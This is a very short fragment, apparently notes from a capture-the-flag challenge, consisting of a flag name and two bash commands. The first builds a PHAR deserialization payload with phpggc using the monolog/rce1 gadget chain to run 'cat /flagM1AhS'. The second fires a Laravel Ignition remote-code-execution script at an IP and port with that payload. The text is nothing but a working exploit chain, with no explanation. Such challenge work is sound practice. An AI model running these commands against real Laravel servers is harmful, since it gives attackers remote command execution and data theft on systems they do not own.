flagM1AhS

bash
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /flagM1AhS"

bash
./laravel-ignition-rce.py http://165.227.234.7:31636/ /tmp/exploit.phar
